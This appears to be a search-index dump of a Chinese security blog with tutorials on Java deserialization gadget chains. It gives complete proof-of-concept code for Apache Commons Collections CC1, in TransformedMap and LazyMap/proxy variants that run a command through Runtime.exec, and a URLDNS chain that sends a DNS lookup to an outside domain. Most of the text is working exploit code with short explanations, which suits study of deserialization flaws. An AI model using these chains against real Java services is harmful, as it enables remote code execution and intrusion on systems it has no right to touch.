HashMap\u003c\u003e(); map.put(\"key\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,invokerTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor annotationInvocationhandleconstructor = c.getDeclaredConstructor(Class.class,Map.class); annotationInvocationhandleconstructor.setAccessible(true); Object o = annotationInvocationhandleconstructor.newInstance(Target.class,transformedMap); 但是这里存在两个问题 第一个问题是Runtime没有实现Seriablable接口，无法参与序列化过程 利用反射来解决，这里再利用一个ChainedTransformer.transform方法 简单来说就是上一个执行transform方法返回的结果作为下一个执行transform方法输入 Transformer[] transformers = new Transformer[]{ new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 还有一个问题，无法控制setValue()里面的参数值 这里利用org.apache.commons.collections.functors.ConstantTransformer的transform()方法，无论传入什么，都会返回固定的值 所以完善一下上面的poc Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); 于是完整的poc如下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.util.HashMap; import java.util.Map; public class CommonsCollection1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); chainedTransformer.transform(Runtime.class); InvokerTransformer invokerTransformer =new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); map.put(\"value\",\"value\"); Map\u003cObject,Object\u003e transformedMap = TransformedMap.decorate(map,null,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } 整个调用栈如下 注 这里为什么要用Target Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,transformedMap); 因为Target中有值是value 这里的getKey()获取的就是，上面map.put()放入的key值 map.put(\"value\",\"value\"); key放入value，正好能取出Target中的值，所以就绕过了if条件 ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 另一条在上面选择任意类执行transform方法的时候，选择了TransformedMap 这次选择另一个类LazyMap中的get()方法 再看一下哪里调用了get()方法，恰好在AnnotationInocationHandler类中的invoke()方法中调用了get()方法 而恰好memberValues也是可控的，那如何调用到invoke()方法呢？ 这里需要一个新的知识点，动态代理，将AnnoationInvocationHandler动态代理，执行任意方法，即可调用到invoke方法，但是根据 invoke 中的if条件，执行的任意方法必须是无参的，恰好在AnnotationInvocationHandler类中的readObject()方法中，有这样的方法存在 于是根据上面的poc修改一下 package org.example.CommonsCollections; import org.apache.commons.collections.Transformer; import org.apache.commons.collections.functors.ChainedTransformer; import org.apache.commons.collections.functors.ConstantTransformer; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.map.LazyMap; import org.apache.commons.collections.map.TransformedMap; import java.io.*; import java.lang.annotation.Target; import java.lang.reflect.Constructor; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Proxy; import java.util.HashMap; import java.util.Map; public class CommonsCollections1 { public static void main(String[] args) throws Exception{ Transformer[] transformers = new Transformer[]{ new ConstantTransformer(Runtime.class), new InvokerTransformer(\"getMethod\",new Class[]{String.class,Class[].class},new Object[]{\"getRuntime\",null}), new InvokerTransformer(\"invoke\",new Class[]{Object.class,Object[].class},new Object[]{null,null}), new InvokerTransformer(\"exec\",new Class[]{String.class},new Object[]{\"/System/Applications/Calculator.app/Contents/MacOS/Calculator\"}) }; ChainedTransformer chainedTransformer = new ChainedTransformer(transformers); HashMap\u003cObject, Object\u003e map = new HashMap\u003c\u003e(); Map\u003cObject,Object\u003e lazymap = LazyMap.decorate(map,chainedTransformer); Class c = Class.forName(\"sun.reflect.annotation.AnnotationInvocationHandler\"); Constructor AnnotationInvocationHandlerConstructor = c.getDeclaredConstructor(Class.class,Map.class); AnnotationInvocationHandlerConstructor.setAccessible(true); InvocationHandler h = (InvocationHandler) AnnotationInvocationHandlerConstructor.newInstance(Target.class,lazymap); Map proxyMap = (Map) Proxy.newProxyInstance(LazyMap.class.getClassLoader(),new Class[]{Map.class},h); Object o = AnnotationInvocationHandlerConstructor.newInstance(Target.class,proxyMap); serialize(o); unserialize(\"ser.bin\"); } public static void serialize(Object obj) throws Exception{ ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(\"ser.bin\")); oos.writeObject(obj); } public static Object unserialize(String filename) throws Exception{ ObjectInputStream ois = new ObjectInputStream(new FileInputStream(filename)); Object obj = ois.readObject(); return obj; } } ","date":"2024-01-14","objectID":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["CommonsCollections"],"title":"CommonsCollections1链详解","uri":"/commonscollections1%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":"世界上最简单的 java 链 先来看一下如何序列化/反序列化 package org.example; import java.io.*; public class App { public static void main( String[] args ) throws Exception { user user = new user(); user.setName(\"xiaoming\"); //序列化输出 ObjectOutputStream out = new ObjectOutputStream(System.out); out.writeObject(user); System.out.println(); // 序列化写入文件 FileOutputStream file = new FileOutputStream(\"test.bin\"); ObjectOutputStream fout = new ObjectOutputStream(file); fout.writeObject(user); // 序列化写入到变量中 ByteArrayOutputStream bout = new ByteArrayOutputStream(); ObjectOutputStream jout = new ObjectOutputStream(bout); jout.writeObject(user); byte[] str = bout.toByteArray(); System.out.println(new String(str)); // 从变量中反序列化 ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); user user_d = (user) ois.readObject(); System.out.println(user_d.getName()); } } class user implements Serializable{ private String name; public user() { } public void setName(String name) { this.name = name; } public String getName() { return name; } } URLDNS链详解","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:0:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"},{"categories":["Java"],"content":" 原理java.util.HashMap重写了readObject方法，在反序列化时调用hash函数计算 key 的 hashCode，而java.net.URL的 hashCode 在计算时会调用getHostAddress来解析域名，从而发出 DNS 请求 由HashMap 类readObject引起， private void readObject(ObjectInputStream s) throws IOException, ClassNotFoundException { reinitialize(); ObjectInputStream.GetField fields = s.readFields(); // Read loadFactor (ignore threshold) float lf = fields.get(\"loadFactor\", 0.75f); if (lf \u003c= 0 || Float.isNaN(lf)) throw new InvalidObjectException(\"Illegal load factor: \" + lf); lf = Math.min(Math.max(0.25f, lf), 4.0f); HashMap.UnsafeHolder.putLoadFactor(this, lf); s.readInt(); // Read and ignore number of buckets int mappings = s.readInt(); // Read number of mappings (size) if (mappings \u003c 0) { throw new InvalidObjectException(\"Illegal mappings count: \" + mappings); } else if (mappings == 0) { // use defaults } else if (mappings \u003e 0) { float fc = (float)mappings / lf + 1.0f; int cap = ((fc \u003c DEFAULT_INITIAL_CAPACITY) ? DEFAULT_INITIAL_CAPACITY : (fc \u003e= MAXIMUM_CAPACITY) ? MAXIMUM_CAPACITY : tableSizeFor((int)fc)); float ft = (float)cap * lf; threshold = ((cap \u003c MAXIMUM_CAPACITY \u0026\u0026 ft \u003c MAXIMUM_CAPACITY) ? (int)ft : Integer.MAX_VALUE); // Check Map.Entry[].class since it's the nearest public type to // what we're actually creating. SharedSecrets.getJavaObjectInputStreamAccess().checkArray(s, Map.Entry[].class, cap); @SuppressWarnings({\"rawtypes\",\"unchecked\"}) Node\u003cK,V\u003e[] tab = (Node\u003cK,V\u003e[])new Node[cap]; table = tab; // Read the keys and values, and put the mappings in the HashMap for (int i = 0; i \u003c mappings; i++) { @SuppressWarnings(\"unchecked\") K key = (K) s.readObject(); @SuppressWarnings(\"unchecked\") V value = (V) s.readObject(); putVal(hash(key), key, value, false, false); } } } 在HashMap的键名计算了 hash， putVal(hash(key), key, value, false, false); 跟进查看一下 调用了key.hashCode()，而这里的 key 是可控的，就是传入的java.net.URL，跟进查看一下 这里hashCode==-1，重新进行hashCode()方法计算，跟进handler查看调用了哪一个hashCode() transient关键字，修饰 Java 序列化对象时，不需要序列化属性也就是handler属性不参与序列化，直接跟进URLStreamHandler查看一下 这里调用了getHostAddress跟进查看一下 又调用了java.net.URL的getHostAddress方法 继续跟进 进入到InetAddress.getByName(host);便会触发DNS请求 继续回到readObject()中，看看如何给key赋值 key是从K key = (K) s.readObject();这串代码，也就是readObject中得到的，说明之前是writeObject会写入 key HashMap#writeObject 进入了internalWriteEntries()跟进查看 这里的key以及value是从 tab 中取的，而 tab 的值即HashMap中 table 的值。 想要修改table的值，就需要调用HashMap#put方法，而HashMap#put方法中也会对key调用一次hash方法，所以这里也会产生一次dns查询 为了避免这次 dns 查询，我们将hashCode设置不为-1的其他值 构造完整poc package org.example; import java.io.*; import java.lang.reflect.Field; import java.net.URL; import java.util.HashMap; public class URLDNS { public static void main(String[] args) throws Exception { HashMap hashmap = new HashMap(); URL url = new URL(\"http://47894df839.ipv6.1433.eu.org\"); Field f = Class.forName(\"java.net.URL\").getDeclaredField(\"hashCode\"); f.setAccessible(true); f.set(url,1); hashmap.put(url,1); f.set(url,-1); ByteArrayOutputStream b = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(b); oos.writeObject(hashmap); byte[] str = b.toByteArray(); System.out.println(str); ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(str)); ois.readObject(); } } 调用栈如下 ","date":"2024-01-14","objectID":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/:1:0","tags":["URLDNS"],"title":"URLDNS链详解","uri":"/urldns%E9%93%BE%E8%AF%A6%E8%A7%A3/"}]